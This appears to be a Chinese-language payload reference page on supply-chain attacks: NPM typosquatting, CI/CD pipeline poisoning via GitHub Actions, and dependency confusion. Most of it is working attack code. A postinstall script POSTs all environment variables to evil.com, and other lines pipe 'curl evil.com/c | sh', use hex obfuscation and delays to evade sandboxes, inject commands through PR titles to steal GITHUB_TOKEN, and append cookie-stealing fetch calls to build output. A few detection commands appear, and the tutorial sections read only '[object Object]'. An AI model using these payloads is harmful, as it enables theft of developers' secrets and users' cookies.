# 供应链攻击 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（3 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. NPM包名仿冒(Typosquatting)

- **id:** `supply-typosquat`
- **分类:** 供应链攻击 / 包管理器投毒
- **tags:** `供应链` `NPM` `Typosquatting` `包投毒` `postinstall`

通过注册与流行NPM包名高度相似的恶意包(如lodash→1odash, colors→co1ors)，诱导开发者误安装。恶意包在install/postinstall钩子中执行反弹Shell、窃取环境变量或植入后门。

**前置条件**

- NPM账号
- 了解目标项目依赖
- 恶意包基础设施

**利用步骤**

#### 1. 侦察目标依赖

```
# 分析目标项目的package.json
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json" | jq '.dependencies, .devDependencies'

# 查询高下载量包
npm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'
```

识别目标项目依赖的流行NPM包作为仿冒目标

| 片段 | 说明 | 类型 |
|---|---|---|
| `raw.githubusercontent.com` | GitHub Raw文件API直接读取源码 | domain |
| `.dependencies, .devDependencies` | jq提取正式和开发依赖列表 | function |
| `npm search` | 搜索NPM注册表中的包信息 | command |

#### 2. 生成仿冒包名

```
# 常见Typosquatting变体生成
original="lodash"
echo "${original}" | python3 -c "
import sys
name=sys.stdin.read().strip()
# 字符替换: l->1, o->0
print(name.replace('l','1'))
# 连字符变体
print(name+'-utils')
print(name+'-js')
# 缺字/多字
print(name[:-1])
print(name+'s')
"

# 检查NPM可用性
for pkg in 1odash lodash-utils lodash-js lodas lodashs; do
  npm view $pkg 2>/dev/null && echo "$pkg: TAKEN" || echo "$pkg: AVAILABLE"
done
```

生成与目标包名相似的多种变体并检查可用性

| 片段 | 说明 | 类型 |
|---|---|---|
| `replace('l','1')` | 字符视觉替换——l换成数字1 | technique |
| `npm view` | 查询包是否已被注册 | command |
| `2>/dev/null` | 隐藏404错误输出 | operator |

#### 3. 构造恶意包

```
# package.json中植入postinstall钩子
{
  "name": "1odash",
  "version": "1.0.0",
  "description": "Utility library for JavaScript",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/telemetry.js"
  }
}

# scripts/telemetry.js —— 窃取环境变量
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  hostname: require('os').hostname()
});
https.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);
```

创建伪装成正常工具库的恶意NPM包，利用install钩子执行恶意代码

| 片段 | 说明 | 类型 |
|---|---|---|
| `postinstall` | NPM生命周期钩子，安装完成后自动执行 | keyword |
| `process.env` | Node.js环境变量对象，可能包含API密钥 | variable |
| `os.hostname()` | 获取主机名用于标识受害目标 | function |

#### 4. 检测与取证

```
# 审计项目依赖安全
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'

# 检查postinstall钩子
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;

# 对比lock文件完整性
npm ci --dry-run 2>&1 | grep -i "warn\|error"

# Socket.dev检测恶意包
npx socket info lodash
```

审计当前项目依赖的安全性，识别可疑install钩子和异常包

| 片段 | 说明 | 类型 |
|---|---|---|
| `npm audit` | 官方依赖安全审计工具 | command |
| `postinstall\|preinstall` | 搜索危险的生命周期钩子 | technique |
| `npm ci --dry-run` | 模拟安装检查lock文件一致性 | command |

**WAF 绕过**

#### 绕过NPM包安全检测

```
# 延迟执行避开沙箱检测
setTimeout(() => {
  // 恶意代码在30秒后执行，绕过自动化分析超时
  require('child_process').exec('curl evil.com/c | sh')
}, 30000);

# 代码混淆
const _0x4f2a=['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x4f2a[0]).exec('...');

# 环境检测——仅在CI/CD中触发
if(process.env.CI || process.env.GITHUB_ACTIONS) {
  // 仅攻击CI/CD环境
}
```

利用延迟执行、代码混淆和环境检测绕过自动化安全扫描

| 片段 | 说明 | 类型 |
|---|---|---|
| `setTimeout(..., 30000)` | 延迟30秒执行，绕过沙箱超时检测 | technique |
| `\x63\x68\x69\x6c\x64` | Hex编码的child_process字符串 | encoding |
| `process.env.CI` | 检测CI环境变量，定向攻击自动化管道 | variable |

**教程**

[object Object]

---

### 2. CI/CD管道投毒

- **id:** `supply-ci-poison`
- **分类:** 供应链攻击 / CI/CD攻击
- **tags:** `供应链` `CI/CD` `GitHub Actions` `Jenkins` `Pipeline`

通过恶意Pull Request、Actions注入或构建脚本篡改来攻击CI/CD管道。攻击者可窃取构建密钥、投毒构建产物或在部署流程中植入后门代码。

**前置条件**

- 目标使用公开CI/CD
- 可提交PR或Fork

**利用步骤**

#### 1. 识别CI/CD配置

```
# 搜索GitHub Actions配置
curl -s "https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows" \
  -H "Authorization: token {GITHUB_TOKEN}" | jq '.[].name'

# 分析工作流中的密钥使用
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml" | grep -E "secrets\.|\$\{\{.*\}\}"
```

分析目标项目的CI/CD配置文件和密钥使用情况

| 片段 | 说明 | 类型 |
|---|---|---|
| `.github/workflows` | GitHub Actions配置目录 | path |
| `secrets\.` | 搜索GitHub Secrets引用 | technique |
| `\$\{\{.*\}\}` | GitHub Actions表达式语法 | format |

#### 2. PR触发的工作流注入

```
# 恶意 .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:  # 危险：在主仓上下文执行
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          # PR中的代码在主仓权限下执行
          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0
          curl -X POST -d @<(env) https://evil.com/collect
```

利用pull_request_target事件在主仓上下文中执行PR代码，窃取Secrets

| 片段 | 说明 | 类型 |
|---|---|---|
| `pull_request_target` | 在主仓(非Fork)上下文中触发，可访问Secrets | keyword |
| `${{ secrets.DEPLOY_KEY }}` | GitHub Actions Secrets表达式注入 | variable |
| `github.event.pull_request.head.sha` | 引用PR的代码——这是恶意payload来源 | variable |

#### 3. Actions表达式注入

```
# PR标题注入
# 创建标题为以下内容的PR:
# test`curl evil.com/s|sh`

# 工作流中若有如下写法则存在注入：
run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# Issue评论注入
# 评论内容:
# "); curl evil.com/steal?token=$GITHUB_TOKEN #

# 注入点搜索
grep -rn '\${{.*github\.event\.' .github/workflows/
```

通过PR标题/Issue评论注入命令到GitHub Actions的run步骤中

| 片段 | 说明 | 类型 |
|---|---|---|
| `${{ github.event.pull_request.title }}` | 不安全的表达式插值——PR标题直接拼入shell命令 | variable |
| `GITHUB_TOKEN` | Actions自动注入的临时令牌 | variable |
| `github.event` | 事件Payload中的用户可控数据 | keyword |

#### 4. 构建产物投毒

```
# 篡改构建脚本注入后门
# 修改 package.json build脚本
"scripts": {
  "build": "react-scripts build && node inject.js"
}

# inject.js——在构建产物中注入代码
const fs = require('fs');
const buildDir = './build/static/js';
fs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {
  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');
  code += '\n;fetch("https://evil.com/log?c="+document.cookie);';
  fs.writeFileSync(`${buildDir}/${f}`, code);
});
```

在构建过程中向产出物注入恶意代码（如Cookie窃取脚本）

| 片段 | 说明 | 类型 |
|---|---|---|
| `react-scripts build && node inject.js` | 在正常构建后追加恶意脚本执行 | command |
| `document.cookie` | 注入的代码窃取用户Cookie | function |

**WAF 绕过**

#### 绕过GitHub Actions安全限制

```
# 使用workflow_dispatch间接触发
# 避免直接在PR中暴露恶意代码
on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: true
steps:
  - run: ${{ github.event.inputs.cmd }}

# 使用第三方Action作为跳板
- uses: malicious-org/innocent-name@main
  # 恶意Action内部窃取secrets

# 环境变量泄露——避免直接echo
- run: |
    python3 -c "import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))"
```

通过间接触发、第三方Action和Python外带绕过日志审计和安全策略

| 片段 | 说明 | 类型 |
|---|---|---|
| `workflow_dispatch` | 手动触发工作流，参数可控 | keyword |
| `${{ github.event.inputs.cmd }}` | 从手动输入注入命令 | variable |
| `urllib.request.urlopen` | 使用Python外带数据避免bash日志记录 | function |

**教程**

[object Object]

---

### 3. 依赖混淆攻击

- **id:** `supply-dependency-confusion`
- **分类:** 供应链攻击 / 依赖混淆
- **tags:** `供应链` `依赖混淆` `NPM` `PyPI` `Dependency Confusion`

利用包管理器在公共注册表和私有注册表之间的解析优先级漏洞。当企业使用内部包名时，攻击者在公共NPM/PyPI注册更高版本号的同名包，包管理器会优先安装公共高版本包从而执行恶意代码。

**前置条件**

- 已知目标内部包名
- 公共注册表账号

**利用步骤**

#### 1. 发现内部包名

```
# 从JavaScript源码中提取import路径
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "require\([\x27\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\x27\x22]\)" | sort -u

# 从package-lock.json泄露中搜索
curl -s "https://{TARGET}/package-lock.json" 2>/dev/null | jq 'keys' 

# GitHub搜索私有包名
# 搜索: "@internal-company/" site:github.com

# 从错误页面/源码注释发现
curl -s "https://{TARGET}" | grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"
```

从前端代码、泄露的lock文件和错误信息中发现目标使用的内部包名

| 片段 | 说明 | 类型 |
|---|---|---|
| `@[a-zA-Z0-9_-]+/` | 匹配NPM scoped package格式 | technique |
| `package-lock.json` | 可能泄露内部依赖信息 | path |
| `require(...)` | 从JS源码提取模块引用 | function |

#### 2. 在公共注册表注册同名包

```
# 创建与内部包同名的公共包
mkdir dependency-confusion-test && cd dependency-confusion-test
npm init -y
# 设置超高版本号
npm version 99.0.0

# 添加无害的检测代码(非恶意)
cat > index.js << 'EOF'
const os = require("os");
const dns = require("dns");
const pkg = require("./package.json");
// 仅DNS回调确认安装——无数据外泄
dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
EOF

npm publish --access public
```

在NPM公共注册表发布与目标内部包同名但版本号更高的包

| 片段 | 说明 | 类型 |
|---|---|---|
| `npm version 99.0.0` | 设置极高版本号确保优先被解析 | command |
| `dns.resolve` | 通过DNS查询确认包被安装(OOB) | function |
| `--access public` | 发布为公开包 | parameter |

#### 3. 监控DNS回调确认命中

```
# 使用Burp Collaborator或自建DNS服务器监控
# Interactsh监控
interactsh-client -v 2>&1 | grep "dep-test"

# 自建DNS记录
sudo tcpdump -i eth0 port 53 -l | grep "dep-test"

# 也可通过HTTP回调
python3 -m http.server 8080 &
# 等待目标CI/CD管道安装包时触发回调
```

监控DNS/HTTP回调确认目标环境安装了公共注册表上的恶意包

| 片段 | 说明 | 类型 |
|---|---|---|
| `interactsh-client` | ProjectDiscovery的OOB交互工具 | command |
| `tcpdump -i eth0 port 53` | 捕获DNS查询流量 | command |

#### 4. 影响评估与报告

```
# 验证受影响的包管理器行为
# NPM: 默认优先公共高版本
npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"

# Python/pip同理
pip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep "Downloading"

# 检查是否配置了registry scope
npm config get @target-corp:registry
```

验证包管理器的解析优先级行为并评估影响范围

| 片段 | 说明 | 类型 |
|---|---|---|
| `--registry` | 指定包注册表地址 | parameter |
| `-dd` | NPM详细调试输出 | parameter |
| `@target-corp:registry` | NPM scoped registry配置 | variable |

**WAF 绕过**

#### 绕过包名注册限制

```
# 如果目标使用unscoped包名
# 直接注册同名公共包(无@scope前缀更容易混淆)

# 跨包管理器攻击
# 目标用NPM但也尝试PyPI
pip install target-internal-lib  # pip没有scope概念

# 使用prerelease标签
npm version 99.0.0-alpha.1
# 某些配置会匹配 >=1.0.0 范围包括prerelease
```

利用unscoped包名、跨包管理器和prerelease版本扩大攻击面

| 片段 | 说明 | 类型 |
|---|---|---|
| `unscoped` | 无@scope前缀的包名更容易发生混淆 | concept |
| `99.0.0-alpha.1` | prerelease标签可能匹配宽松的版本范围 | value |

**教程**

[object Object]
